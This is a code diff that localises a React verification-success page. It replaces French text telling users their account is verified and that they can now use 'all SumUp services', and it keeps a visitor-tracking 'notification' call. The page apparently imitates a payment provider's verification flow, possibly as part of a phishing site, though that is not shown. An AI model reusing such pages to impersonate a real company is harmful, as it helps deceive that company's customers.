@@ -2,9 +2,14 @@ import { useEffect } from "react";
 import { Link } from "wouter";
 import { CheckCircle2 } from "lucide-react";
 import { apiRequest } from "@/lib/queryClient";
+import { useTranslation } from "@/contexts/LanguageContext";
 
 export default function Success() {
+  const { t } = useTranslation();
+
   useEffect(() => {
+    document.title = t('success_page_title');
+    
     // Track visitor when page loads with language info
     const language = navigator.language || 'Unknown';
     apiRequest("POST", "/api/track-visit", { 
@@ -22,7 +27,7 @@ export default function Success() {
     }).catch(() => {
       // Silent fail - notification shouldn't break the app
     });
-  }, []);
+  }, [t]);
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
@@ -40,10 +45,10 @@ export default function Success() {
         {/* Success Message */}
         <div className="space-y-4">
           <h1 className="text-4xl font-bold text-black" data-testid="text-title">
-            Vérification réussie !
+            {t('success_title')}
           </h1>
           <p className="text-lg text-gray-600" data-testid="text-description">
-            Votre compte a été vérifié avec succès.
+            {t('success_description')}
           </p>
         </div>
 
@@ -51,15 +56,15 @@ export default function Success() {
         <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 space-y-3">
           <div className="flex items-center justify-center gap-2 text-sm text-gray-700">
             <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
-            <span>Authentification sécurisée</span>
+            <span>{t('success_detail_1')}</span>
           </div>
           <div className="flex items-center justify-center gap-2 text-sm text-gray-700">
             <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
-            <span>Identité vérifiée</span>
+            <span>{t('success_detail_2')}</span>
           </div>
           <div className="flex items-center justify-center gap-2 text-sm text-gray-700">
             <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
-            <span>Accès autorisé</span>
+            <span>{t('success_detail_3')}</span>
           </div>
         </div>
 
@@ -71,12 +76,12 @@ export default function Success() {
               className="w-full h-12 bg-black text-white font-semibold rounded-md hover:bg-opacity-90 transition-all"
               data-testid="button-go-home"
             >
-              Accéder au tableau de bord
+              {t('success_button_home')}
             </button>
           </Link>
 
           <p className="text-sm text-gray-500">
-            Vous pouvez maintenant accéder à tous les services SumUp
+            {t('success_tagline')}
           </p>
         </div>
 
